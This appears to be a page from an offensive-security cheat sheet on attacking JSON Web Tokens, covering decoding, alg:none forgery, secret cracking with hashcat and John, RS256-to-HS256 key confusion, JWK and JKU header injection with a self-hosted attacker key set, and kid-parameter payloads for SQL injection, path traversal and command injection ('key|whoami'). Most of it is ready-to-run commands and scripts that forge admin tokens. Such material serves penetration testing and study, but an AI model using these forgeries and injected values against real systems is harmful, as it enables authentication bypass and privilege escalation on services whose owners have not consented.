# JWT (JSON Web Token) Attacks

## Table of Contents

- [Overview](#overview)
- [JWT Structure](#jwt-structure)
- [Algorithm Confusion](#algorithm-confusion)
- [None Algorithm Attack](#none-algorithm-attack)
- [Weak Secret Attack](#weak-secret-attack)
- [Key Confusion (RS256 to HS256)](#key-confusion-rs256-to-hs256)
- [JWK Header Injection](#jwk-header-injection)
- [JKU Header Injection](#jku-header-injection)
- [Kid Parameter Injection](#kid-parameter-injection)
- [Token Manipulation](#token-manipulation)
- [jwt_tool Quick Reference](#jwt_tool-quick-reference)
- [Burp Suite Extensions](#burp-suite-extensions)
- [Quick Reference Table](#quick-reference-table)

---

## Overview

JSON Web Tokens (JWT) are used for authentication and authorization. They consist of three Base64URL-encoded parts separated by dots.

**Common Vulnerabilities:**

- Algorithm confusion attacks
- Weak signing secrets
- Key injection via headers
- Improper verification

**Tools:**

| Tool | Description |
| :--- | :--- |
| jwt_tool | JWT manipulation and attack tool |
| jwt.io | Online JWT decoder |
| hashcat | JWT secret cracking |
| john | JWT secret cracking |

---

## JWT Structure

```text
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Decode JWT

> Using base64 (Linux)

```shell
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
```

> Using jwt_tool

```shell
python3 jwt_tool.py $jwt
```

> Using Python

```python
import base64
import json

jwt = "$jwt"
parts = jwt.split(".")
header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
print(f"Header: {header}")
print(f"Payload: {payload}")
```

---

## Algorithm Confusion

### Identify Algorithm

> Check header for alg field

```shell
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"RS256","typ":"JWT"}
```

### Common Algorithms

| Algorithm | Type | Description |
| :--- | :--- | :--- |
| HS256 | Symmetric | HMAC with SHA-256 |
| HS384 | Symmetric | HMAC with SHA-384 |
| HS512 | Symmetric | HMAC with SHA-512 |
| RS256 | Asymmetric | RSA with SHA-256 |
| RS384 | Asymmetric | RSA with SHA-384 |
| RS512 | Asymmetric | RSA with SHA-512 |
| ES256 | Asymmetric | ECDSA with SHA-256 |
| none | None | No signature |

---

## None Algorithm Attack

If the server accepts "none" algorithm, signature verification is bypassed.

### Manual Exploitation

> Create header with alg: none

```shell
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
```

> Create payload

```shell
echo -n '{"sub":"admin","role":"admin","iat":1234567890}' | base64 -w0 | tr '+/' '-_' | tr -d '='
```

> Combine (no signature)

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0.
```

### Using jwt_tool

> None algorithm attack

```shell
python3 jwt_tool.py $jwt -X a
```

### Variations

```text
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

---

## Weak Secret Attack

### Crack with hashcat

> Mode 16500 for JWT

```shell
hashcat -m 16500 jwt.txt $wordlist
```

> With rules

```shell
hashcat -m 16500 jwt.txt $wordlist -r /usr/share/hashcat/rules/best64.rule
```

### Crack with John

```shell
john jwt.txt --wordlist=$wordlist --format=HMAC-SHA256
john jwt.txt --wordlist=$wordlist --format=HMAC-SHA512
```

### Crack with jwt_tool

```shell
python3 jwt_tool.py $jwt -C -d $wordlist
```

### Common Weak Secrets

```text
secret
password
123456
your-256-bit-secret
jwt_secret
changeme
```

### Sign with Cracked Secret

> Using jwt_tool

```shell
python3 jwt_tool.py $jwt -T -S hs256 -p "cracked_secret"
```

> Using Python

```python
import jwt

payload = {"sub": "admin", "role": "admin"}
token = jwt.encode(payload, "cracked_secret", algorithm="HS256")
print(token)
```

---

## Key Confusion (RS256 to HS256)

When RS256 is used, public key is available. If server also accepts HS256, we can sign with public key.

### Attack Steps

> **Step 1:** Get public key

```shell
openssl s_client -connect $rhost:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem
# Or from /jwks.json, /.well-known/jwks.json
```

> **Step 2:** Convert key format (if needed)

```shell
# From JWK to PEM
python3 -c "
import json
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm

jwk = json.loads(open('jwks.json').read())['keys'][0]
public_key = RSAAlgorithm.from_jwk(json.dumps(jwk))
pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
print(pem.decode())
"
```

> **Step 3:** Sign JWT with public key using HS256

```shell
python3 jwt_tool.py $jwt -X k -pk public.pem
```

### Manual Python Script

```python
import jwt
import hmac
import hashlib
import base64

# Read public key
with open("public.pem", "r") as f:
    public_key = f.read()

# Modify payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}

# Create token signed with public key as HMAC secret
token = jwt.encode(payload, public_key, algorithm="HS256", headers=header)
print(token)
```

---

## JWK Header Injection

If server trusts the JWK embedded in token header.

### Generate Key and Sign

```shell
python3 jwt_tool.py $jwt -X i
```

### JWK Manual Exploitation

```python
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# Generate new RSA key
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

# Create payload
payload = {"sub": "admin", "role": "admin"}

# Create token with embedded JWK
token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers={"jwk": jwt.algorithms.RSAAlgorithm.to_jwk(private_key.public_key())}
)
print(token)
```

---

## JKU Header Injection

JKU (JWK Set URL) header points to external URL for public keys.

### JKU Attack Steps

> **Step 1:** Generate RSA keypair

```shell
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

> **Step 2:** Create JWKS file

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import json
import base64

with open("public.pem", "rb") as f:
    public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

numbers = public_key.public_numbers()
jwks = {
    "keys": [{
        "kty": "RSA",
        "kid": "attacker-key",
        "use": "sig",
        "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, 'big')).decode().rstrip('='),
        "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, 'big')).decode().rstrip('=')
    }]
}
print(json.dumps(jwks, indent=2))
```

> **Step 3:** Host JWKS on attacker server

```shell
python3 -m http.server 80
```

> **Step 4:** Sign token with JKU pointing to attacker

```shell
python3 jwt_tool.py $jwt -X s -ju "http://$lhost/jwks.json" -pr private.pem
```

---

## Kid Parameter Injection

KID (Key ID) is used to select which key to use. May be vulnerable to injection.

### SQL Injection via kid

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'secret'--"
}
```

### Path Traversal via kid

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}
```

> Sign with empty secret (file contains nothing)

```shell
python3 jwt_tool.py $jwt -I -hc kid -hv "../../../dev/null" -S hs256 -p ""
```

### Command Injection via kid

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key|whoami"
}
```

---

## Token Manipulation

### Modify Payload Claims

> Using jwt_tool

```shell
python3 jwt_tool.py $jwt -T
# Interactive tampering mode
```

> Specific claim modification

```shell
python3 jwt_tool.py $jwt -I -pc role -pv admin
python3 jwt_tool.py $jwt -I -pc sub -pv administrator
```

### Common Claims to Target

| Claim | Description |
| :--- | :--- |
| sub | Subject (user ID) |
| role | User role |
| admin | Admin flag |
| exp | Expiration time |
| iat | Issued at |
| iss | Issuer |
| aud | Audience |

---

## jwt_tool Quick Reference

### Scanning

```shell
# All attacks
python3 jwt_tool.py $jwt -M at

# Specific attacks
python3 jwt_tool.py $jwt -X a    # alg:none
python3 jwt_tool.py $jwt -X n    # null signature
python3 jwt_tool.py $jwt -X k    # key confusion
python3 jwt_tool.py $jwt -X i    # JWK injection
python3 jwt_tool.py $jwt -X s    # JKU spoofing
```

### Tampering

```shell
# Interactive
python3 jwt_tool.py $jwt -T

# Inject claim
python3 jwt_tool.py $jwt -I -pc claim_name -pv claim_value

# Modify header
python3 jwt_tool.py $jwt -I -hc header_name -hv header_value
```

### Cracking

```shell
# Dictionary attack
python3 jwt_tool.py $jwt -C -d $wordlist
```

---

## Burp Suite Extensions

- **JSON Web Tokens** - Decode and manipulate JWTs
- **JWT Editor** - Full JWT manipulation
- **JOSEPH** - JWT attacks automation

---

## Quick Reference Table

| Attack | Condition | Payload |
| :--- | :--- | :--- |
| None algorithm | Server accepts none | `"alg": "none"` |
| Weak secret | Weak HMAC key | Crack with hashcat |
| Key confusion | RS256â†’HS256 accepted | Sign with public key |
| JWK injection | Server trusts header JWK | Embed attacker key |
| JKU injection | Server fetches JKU | Point to attacker URL |
| Kid injection | Kid used in query/path | SQLi/Path traversal |

---

## ðŸ“š See Also

### Related Web Attacks

- **[IDOR & Access Control](7.10.IDOR-Access-Control.md)** - Access control bypass techniques
- **[OAuth Vulnerabilities](7.18.OAuth-Vulnerabilities.md)** - OAuth token attacks
- **[SQL Injection](7.1.SQL-Injection.md)** - Kid parameter SQL injection
